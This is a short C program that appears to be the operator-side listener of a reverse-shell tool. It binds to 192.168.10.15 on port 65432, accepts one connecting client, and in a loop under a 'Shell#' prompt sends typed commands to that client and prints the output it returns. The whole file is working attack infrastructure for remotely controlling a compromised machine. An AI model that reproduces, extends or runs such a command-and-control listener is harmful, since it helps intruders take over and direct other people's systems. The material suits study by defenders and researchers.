#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
	char buffer[1024];
	char response[18384];
	int sock, client_sock;
	struct sockaddr_in server_addr, client_addr;
	int optval = 1;
	socklen_t client_length;
	char* server_ip = "192.168.10.15";
	unsigned short server_port = 65432;
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
		printf("Error on setting socket options\n");
		return 1;
	}
	
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(server_ip);
	server_addr.sin_port = htons(server_port);
	
	bind(sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
	listen(sock, 5);

	client_length = sizeof(client_addr);
	client_sock = accept(sock, (struct sockaddr *) &client_addr, &client_length);
	
	while(1) {
		memset(&buffer, 0, sizeof(buffer));

		printf("* Shell#%s~$: ", inet_ntoa(client_addr.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");

		write(client_sock, buffer, sizeof(buffer));

		if(strncmp(buffer, "exit", 4) == 0) {
			break;
		}
		else if(strncmp(buffer, "cd ", 3) == 0) {
			continue;
		}
		else {
			recv(client_sock, response, sizeof(response), MSG_WAITALL);
			printf("%s\n", response);
		}
	}
}
